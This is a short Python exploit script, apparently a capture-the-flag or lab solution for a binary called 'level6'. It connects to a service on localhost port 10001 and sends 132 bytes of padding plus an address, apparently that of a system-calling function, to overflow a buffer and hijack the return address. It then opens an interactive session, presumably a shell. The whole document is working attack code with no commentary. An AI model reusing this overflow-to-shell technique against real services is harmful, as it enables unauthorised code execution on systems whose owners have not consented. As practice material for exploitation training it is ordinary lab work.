#!/usr/bin/env python
from pwnxx import *
 
#p = process('./level6')
p = remote('127.0.0.1',10001)

p.recvuntil('\n')

callsystemaddr = 0x00008554 + 1
payload =  'A'*132 + p32(callsystemaddr)

p.send(payload)
 
p.interactive()

